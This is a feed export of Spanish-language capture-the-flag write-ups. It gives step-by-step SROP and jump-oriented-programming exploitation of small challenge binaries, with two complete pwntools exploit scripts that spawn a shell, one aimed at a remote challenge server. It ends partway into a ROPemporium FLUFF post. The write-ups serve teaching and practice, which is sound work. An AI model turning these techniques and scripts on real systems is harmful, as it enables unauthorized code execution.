+&lt;p&gt;Y dado que llamamos de nuevo read usaremos read para setear los valores de RSI a .data (y escribir /bin/sh para luego usarlo con execve()). Y RDX a 8 para setear luego RAX al mismo valor, nuestro payload queda así (&lt;a href=&quot;https://docs.pwntools.com/en/stable/rop/srop.html&quot;&gt;gracias pwntools!&lt;/a&gt;)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/0uG6QbXl1yGKIUbQnN3CH0J4NUfk0WSRCud8RZw6iwOY7tRs2eg2FBUYf_A_WIiIUnvRDuJF9utMnudAWydObKGl6DdcmSb764aXSjMTBaVh42dFyyvC-cgwtcF5WkNc7SyUAQO3&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora le ponemos bencina a la cosa y ejecutamos, podemos ver la llamada a read para escribir en .data:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:583,&quot;height&quot;:130} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/UWLV5sSJr7pNMYjY4trWaoCurFox6xsrv-MTJf8ajs2wqY-Lh1mNMOgI9di9-z592GTH-WA9rHesWVMt9xqtLovi8Jpj2az2mOhbE8Ctst5yEhqCRSSS6Pt_AkSkiKCMHQGvZ4E3&quot; alt=&quot;&quot; width=&quot;583&quot; height=&quot;130&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;y luego sigreturn para setear los registros&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:568,&quot;height&quot;:164} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/mdTIBma4otEJsJnXXRuOYAzdqrqVlU70tI9OVjNv36mXgFSgMqZerDA4mAo3qu-jwSDSRrq83NZ8RtPrfdSZzq1Wn-4z4kG9WASKLpRswBJPUDcQ99hUdQ8Yo3UilukwCS2zQpzC&quot; alt=&quot;&quot; width=&quot;568&quot; height=&quot;164&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y finalmente exceve() con la llamada a /bin/sh&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;width&quot;:580,&quot;height&quot;:121} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/UaAOu2VSnD_FYFnHgYrYHzCXNmtZ3b9nlf3V_4RgaPDqZzeYWJ20hgaOP9QeEHngcT0CtJ9eqfJXJ6M7xoUsNBRetQSrmlI6Y-L185RU7KdUbW3j2SlSNdpS0RH-GGkFRDhpbXKx&quot; alt=&quot;&quot; width=&quot;580&quot; height=&quot;121&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora aprobamos remoto y BANG! FLAG DANCE! &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/KFc40PWR-jb9LykpS7NI6KZrUy3eernjVA0gyGm_368DxHVjDptj9DzsBZfzyb9-gMISC5aByM3nkGZwIvoBlPgTy3oqclLKiymKbQ-8NOOuUk7An9gIhM5EOVieZh_6lbqvwW4u&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Aca les dejo el exploit completo, lo pase genial! Pronto espero compartir mas writeups del CTF, estuvo muy bueno!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;from pwn import *
+from time import sleep
+
+context.clear(arch=&quot;amd64&quot;)
+gdbscript = '''
+break *0x00400107
+continue
+'''
+data = 0x600124
+dispatcher = 0x00400107
+binsh = &quot;/bin/sh\x00&quot;
+syscall = 0x400105
+
+payload = (cyclic(256))
+payload += p64(0x400115) #pop rcx
+payload += p64(dispatcher)#rcx
+payload += p64(0x400114)#pop
+payload += p64(data)#rsi
+payload += p64(0x8)#rdx
+payload += p64(0x4000ff)#read
+payload += p64(0x400119)
+payload += p64(syscall)
+
+frame = SigreturnFrame(kernel=&quot;amd64&quot;)
+frame.rax = 0x3b
+frame.rdi = data
+frame.rsi = 0 
+frame.rdx = 0
+frame.rip = syscall
+payload += str(frame)
+
+#r = gdb.debug('./nanana', gdbscript)
+#r = process('./nanana')
+r = remote('172.104.234.7', 7891)
+r.sendline(payload)
+sleep(1)
+r.sendline(binsh)# instrucciones?
+
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">Vengo con el vuelo del CTF de CONVID que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&amp;nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran c4e venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil</summary></entry><entry><title type="html">WRITEUP, JuuJuu, PWNDAY#01 soluciones</title><link href="http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html" rel="alternate" type="text/html" title="WRITEUP, JuuJuu, PWNDAY#01 soluciones" /><published>2020-05-23T22:11:00-04:00</published><updated>2020-05-23T22:11:00-04:00</updated><id>http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones</id><content type="html" xml:base="http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Hace un tiempo el gran &lt;a href=&quot;https://c4ebt.github.io/&quot;&gt;&lt;strong&gt;c4e&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de &lt;a href=&quot;https://c4ebt.github.io/&quot;&gt;&lt;strong&gt;c4e&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D,  y bueno también porque nunca había utilizado JOP)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;JOP o Jump Oriented Programming, es una técnica basada en ROP de la cual ya he hablado en este blog, pero en vez de usar un ret al final, usamos instrucciones de salto o JMP para volver a parte controlada del código con gadgets llamados dispatchers, para aprender más sobre JOP, acá hay un &lt;a href=&quot;https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf&quot;&gt;&lt;strong&gt;paper &lt;/strong&gt;&lt;/a&gt;que explica bastante bien todo.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Primero comenzamos debugeando el binario, el cual podemos ver es un ejecutable x64&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/d6Q0oGMfS-PO77AAuhXj_bDjisXHOyuL2WvirnjpnI6bCNhbdGx3ID_igKxv0ZRXNPv9BoymjTU0tjCM2PNkD61x6Bfb1shCVn5AaU2oKjhKTOX4CdDCUwuYyzXeyBQFDHuh_3Wr&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Observamos las protecciones del binario usando &lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot;&gt;checksec&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/kUjY_aEuVv_rX8Qk50Fv_tn_cAysA1PV5lxD0oVXMfeDEb-ubnIdsjBMQ59XdZasVfVXBmO5ukWhBeNBlv3WGalFkCU_mWJfS8B0xdwR1ZNCoEdN7vTaJ1M6BFF3PtVjY01uFnsZ&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Las direcciones del binario se mantendrán debido al “flag” de “no-pie” esto nos será de ayuda ya que no debemos bypassear aslr usando gadgets dentro del binario, al observar el programa vemos que es bastante pequeno, escrtito en assembler, y con solo una funcion que lee&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/0kaKbB3JMAlNESHFraL0R2JMDyIcFUsfu9ERXa_v4MjKlQ45he6vXNH5ZkUuhWWiQDUHVTRaeXJwqRViwWYXjLmuvPE5Y1AtZT0tXeikVgDiTjIl-hqcP7Ifi_mN65MkQQrPqalc&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ademas ya podemos observar que no hay aparentes instrucciones ret lo cual podemos comprobar ejecutando ropper y/o objdump&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Además todos los saltos son a registros “dereference” ([reg]), por lo cual no podemos hacer, por ejemplo, un pop RCX y luego saltar a RCX, ya que el salto será a [RCX], por lo cual debemos ver la forma de filtrar alguna direccion del stack para poder calcular los offsets a cada registro.&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Para nuestra suerte tenemos un primer gadget que podemos usar como dispatcher y es la dirección 4000c7, la cual suma 8 a RSP y luego salta al dereference de RSP-0x8 por tanto nos permitirá saltar a la dirección que pongamos antes en nuestro payload, por lo que la enviaremos de la siguiente forma:&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/F9dYG3ZVDfsbgMbngSVOlZ3jcO7bJWki760g4WTijbBFs8SEzf-64e5pcQEjV1Zv-OepNs1gDlp_h7pV6gPHIATpkzsmuJenBnSc0EJsMhulp1KCBzr4FR755cBDazLU29r3rJns&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Usamos la direccion 4000d4 como salto ya que dicha dirección contiene un push de RSP que empujara la dirección de RSP al stack y nos permitirá controlar el salto a RCX ya que RCX contendrá la dirección del stack donde se encuentra ADD RSP + 8 ; JMP [rsp-0x8]&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/Y8O0LSbcwXYc4szVnE4RolzZlBhukS0e2OS2h1UUfdseLoHFRLVUXHDchdBo00pIYGxdALhS2MKi4wdA1jhVKZHpebRgDlAscHHOJirhg23PWfg8DycDSL-vp_6j22-KWeA73Odo&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto ya podemos setear nuestro dispatcher en [RCX]&amp;nbsp; y aprovechando el vuelo usando los gadgets lo seteamos a RBP y r10 (ya que el código lo permite). Ahora cualquier instrucción que pongamos se ejecutará, siempre cuando tenga un salto a [RCX]. [RBP] o [r10]&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora nos topamos con otro obstáculo! El stack es muy pequeño, qué podemos hacer? Pivotear!, pues para eso usaremos la instrucción en 400131 la cual le resta 0x100 al stack con esto haremos un salto atrasa 32 bytes de nuestro salto inicial&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Seteamos el dispatcher nuevamente a RCX y ahora ejecutamos el syscall de write, para que write? Pues dado que no tenemos idea de donde encontrar nuestro stack para poder hacer una llamada a los registros sin tener que forzosamente dar cero a RAX (otro problema), pues debemos lekear una dirección del stack, para esto usaremos write y escribiremos el leak al stdout para leerlo. Con esto el programa se ejecutara de nuevo, pero esta vez tendremos la dirección del stack a nuestro alcance para hacer los cálculos de gadgets correspondientes&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/cBSsS9AVRUBSYndiDIdGjS0v5McYASHa56xbTweIjzyG3FUd7X3QKaA8yI94IvlYStMiDjGQoYKNotT2kPj_C1X1mXTFbD1jt4rkG11WB4os3r7h2ZclZtUWW9QCTBPOynhLtfBM&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Perfecto ya con este leak podemos comenzar a preparar nuevamente el exploit repitiendo los primeros pasos pero esta vez en vez de llamar a write, jugaremos con los valores de los registros para poder llamar a execve() con el offset desde nuestro leak al string de /bin/sh que enviaremos al comienzo del payload&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/Vz3Yx0E-cTm9H9vsDHSqP821bBOOLmM_IHnLHAEbFj5u4dn9vegw4aJmMYE7hMU0HxiSkJnFvAuf-Xuo8cT9hPlEQhtf0LbpdQQ_e5oSlVykw2t2g_7LfJ0HKQMS4TiXd84u7e8d&quot; alt=&quot;&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Perfecto y ejecutamos y SHELL&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Disfrute mucho este reto, siento que cuando uno se ve atrapado es cuando uno más aprende, de verdad felicitaciones nuevamente al creador del reto. EL resto de solucioens pueden verlas en mi github&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/dplastico/pwnday01&quot;&gt;https://github.com/dplastico/pwnday01&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Aca les dejo el exploit final:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;from pwn import *
+
+#0x4000c5 syscall
+#offset 2 24
+r = process('./juujuu')
+#gdb.attach(r)
+#r = remote('159.89.45.52', 5555)
+empezando = &quot;/bin/sh\0&quot; #controlamos este registro, rsi
+
+#stage 1
+#------------------------------------------------------------#
+#construyendo salto atras
+jop = &quot;A&quot; * 24
+#saltando a rsp +8 , [rsp-8]
+jop += p64(0x4000d4)
+jop += p64(0x4000c7)
+#write syscall para hacer un leak del stack
+jop += p64(0x4000fc)
+jop += p64(0x004000b0)
+
+junk = &quot;A&quot; * (cyclic_find('qaac')-len(empezando)-8-len(jop))                        
+payload = empezando                                                               
+payload += jop                                                                      
+payload += junk
+
+#seteando [rcx] a dispatcher                                                    
+payload += p64(0x4000d4)                                                   
+payload += p64(0x4000c7)
+
+#[rbp] a dispatcher
+payload += p64(0x00000000004000cf)
+
+#setear r10 a dispatcher, por que si no mas
+payload += p64(0x4000ec)
+
+#mas stack (pivot)                                                      
+payload += p64(0x0000000000400131)#sub rsp 100                                  
+r.sendline(payload)
+
+#--------------------------------------------------------#
+
+#stage2
+#recibiendo leak del stack
+resp = u64(r.recv(8))
+print &quot;LEAK  STACK  :   &quot;,hex(resp)
+
+#seteando salto atras para syscall final execve()
+jop2 = &quot;A&quot; * 32
+#
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400125)
+jop2 += p64(resp-0x1c8) #address the bin sh enviada esta 0x1c8 del leak de stack
+jop2 += p64(0x40011b)# xor los otros reg
+jop2 += p64(resp)
+jop2 += p64(0x400101) #syscall
+
+junk = &quot;A&quot; * (cyclic_find('qaac')-len(empezando)-8-len(jop2))                                             
+payload2 = empezando  #/bin/sh                                                               
+payload2 += jop2                                                                     
+payload2 += junk
+#seteando [rcx] a dispatcher                                                   
+payload2 += p64(0x4000d5) #rax a 0x0 y luego a 0x1                                                  
+payload2 += p64(resp)#restaurando rcx
+payload2 += p64(0x4000de) #inc RAX
+payload2 += p64(resp)#restaurando rcx
+#ganando stack
+payload2 += p64(0x0000000000400131)#sub rsp 100                                            
+r.sendline(payload2)
+
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;</content><author><name></name></author><category term="Sin categoría" /><summary type="html">Hace un tiempo el gran c4e me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de c4e que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D, y bueno también porque nunca había utilizado JOP)</summary></entry><entry><title type="html">Romemporium x64, Soluciones</title><link href="http://localhost:4000/bof/oriented/programming/pwn/return/rop/ropemporium/sin%20categor%C3%ADa/writeup/2020/05/04/romemporium-x64-soluciones.html" rel="alternate" type="text/html" title="Romemporium x64, Soluciones" /><published>2020-05-04T22:02:00-04:00</published><updated>2020-05-04T22:02:00-04:00</updated><id>http://localhost:4000/bof/oriented/programming/pwn/return/rop/ropemporium/sin%20categor%C3%ADa/writeup/2020/05/04/romemporium-x64-soluciones</id><content type="html" xml:base="http://localhost:4000/bof/oriented/programming/pwn/return/rop/ropemporium/sin%20categor%C3%ADa/writeup/2020/05/04/romemporium-x64-soluciones.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Quiero acostumbrarme a escribir más en este blog, pero soy flojo, así que mientras, les comparto mis soluciones para &lt;a href=&quot;https://ropemporium.com/&quot;&gt;ROPemporium &lt;/a&gt;en x64, hace poco estuve aprendiendo algunas cosas nuevas de ROP, para unos desafíos y recordé estos ejercicios, algunas personas me pidieron compartir otras soluciones, así que aca estan En lo personal creo son muy buenos para aprender ROP y además son muy entretenidos, por lo que si no lo haz hecho, hazlo por ti mismo antes de ver los writeups ;)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/dplastico/ropemporiumx64&quot;&gt;&lt;strong&gt;https://github.com/dplastico/ropemporiumx64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;</content><author><name></name></author><category term="bof" /><category term="oriented" /><category term="programming" /><category term="pwn" /><category term="return" /><category term="rop" /><category term="ROPemporium" /><category term="Sin categoría" /><category term="writeup" /><summary type="html">Quiero acostumbrarme a escribir más en este blog, pero soy flojo, así que mientras, les comparto mis soluciones para ROPemporium en x64, hace poco estuve aprendiendo algunas cosas nuevas de ROP, para unos desafíos y recordé estos ejercicios, algunas personas me pidieron compartir otras soluciones, así que aca estan En lo personal creo son muy buenos para aprender ROP y además son muy entretenidos, por lo que si no lo haz hecho, hazlo por ti mismo antes de ver los writeups ;) https://github.com/dplastico/ropemporiumx64</summary></entry><entry><title type="html">WRITEUP, ROPemporium, FLUFF (x64)</title><link href="http://localhost:4000/buffer%20overflow/ctf/dplastico/exploit%20dev/exploitdev/pwn/rop/ropemporium/sin%20categor%C3%ADa/2020/04/22/writeup-ropemporium-fluff-x64.html" rel="alternate" type="text/html" title="WRITEUP, ROPemporium, FLUFF (x64)" /><published>2020-04-22T01:21:00-04:00</published><updated>2020-04-22T01:21:00-04:00</updated><id>http://localhost:4000/buffer%20overflow/ctf/dplastico/exploit%20dev/exploitdev/pwn/rop/ropemporium/sin%20categor%C3%ADa/2020/04/22/writeup-ropemporium-fluff-x64</id><content type="html" xml:base="http://localhost:4000/buffer%20overflow/ctf/dplastico/exploit%20dev/exploitdev/pwn/rop/ropemporium/sin%20categor%C3%ADa/2020/04/22/writeup-ropemporium-fluff-x64.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Hace tiempo que no escribia, pero tenia este post guardado de hace un tiempo, asi que hoy me anime a tomar un par de screenshots y hablar al respecto, ya que me parecio un ejercico super bueno para explicar como funciona ROP, esta vez con algunos gadgets un poco inusuales, asi que con el animo de seguir con lo educativo (que a mi me sirve para aprender) nos lanzamos con este post&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;El challenge esta tomado de ROPemporium, excelente pagina para aprender explotacion con ROP y binarios con DEP escencialmente. De verdad creo que los ejercicios son super y hacerlo sin mirar un writeup ayuda definitivamnete, por lo que si no has hecho el reto FLUFF (o si estas ya haciendo tus primeros ROP) Te recomiendo que lo intentes por ti mismo, definitivamente te servira&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://ropemporium.com/challenge/fluff.html&quot;&gt;FLUFF ROPEMPORIUM&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;El challenge podemos ver es un binario de 64 bits (hay una version de 32, pero esta vez hare la de 64) con proteccion NX activada&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:176,&quot;width&quot;:597,&quot;height&quot;:147} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-1.png&quot; alt=&quot;&quot; class=&quot;wp-image-176&quot; width=&quot;597&quot; height=&quot;147&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Podemos observar también las funciones del programa usando gdb (que estare usando para debugear el binario junto con el plugin &lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot;&gt;pwndbg&lt;/a&gt;)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Al ejecutar el programa vemos que espera que ingresemos nuestro input (el cual luego veremos nos llevara a un Buffer Overflow)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:195} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-16.png&quot; alt=&quot;&quot; class=&quot;wp-image-195&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:177} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-2.png&quot; alt=&quot;&quot; class=&quot;wp-image-177&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Vemos varias funciones con nombres que nos dan pistas de cómo pwnear este binario, pero vamos por lo primero, que tenemos en main? Claramente vemos una llamada a la función pwnme&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:179} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-3.png&quot; alt=&quot;&quot; class=&quot;wp-image-179&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Chequeamos usando cyclic donde ocurre el overflow y que registros podemos controlar:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:193} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-14.png&quot; alt=&quot;&quot; class=&quot;wp-image-193&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Comprobamos el offset a RSP, el cual es 40&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:194} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-15.png&quot; alt=&quot;&quot; class=&quot;wp-image-194&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;La cual podemos observar tiene un Buffer overflow en fgets (no entraré en detalles de buffer overflow esta vez, puedes leer al respecto en este &lt;a href=&quot;/tutorial-simple-stack-buffer-overflow/&quot;&gt;post&lt;/a&gt; , o bien &lt;a href=&quot;https://es.wikipedia.org/wiki/Desbordamiento_de_b%C3%BAfer&quot;&gt;aca&lt;/a&gt;.)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:180} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-4.png&quot; alt=&quot;&quot; class=&quot;wp-image-180&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Procedemos ahora a buscar funciones para pwnear este binario, una forma seria llamando a system, pero el string de “/bin/sh” no se encuentra disponible para hacer el clasico &lt;a href=&quot;https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;amp;-return-to-libc-chaining-tutorial.pdf&quot;&gt;ret2libc&lt;/a&gt; (o ret2system en este caso)&lt;br /&gt;observamos ambas funciones, en UsefulFuction, podemos ver una llamada a system que nos servirá más adelante&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:181} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-5.png&quot; alt=&quot;&quot; class=&quot;wp-image-181&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pero en questionableGadgets observamos varios pop y sobre todo un MOV [r10], r11. Esto es importante ya que nos permite copiar la dirección que sea que esté en r11 dentro de la dirección que contiene r10, por lo mismo si encontramos una zona del binario donde escribir (RW) podemos escribir el string de /bin/sh para luego cargarlo en RDI y llamar a system, si aun no has hecho este desafio, te&amp;nbsp; sugiero &amp;nbsp;intentar &amp;nbsp;esta &amp;nbsp;parte &amp;nbsp;por &amp;nbsp;ti &amp;nbsp;mismo, &amp;nbsp;es &amp;nbsp;lo &amp;nbsp;mas entretenido&amp;nbsp;;)&lt;br /&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;OK, Estos son los gadgets con los que trabajaremos&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:182} --&gt;
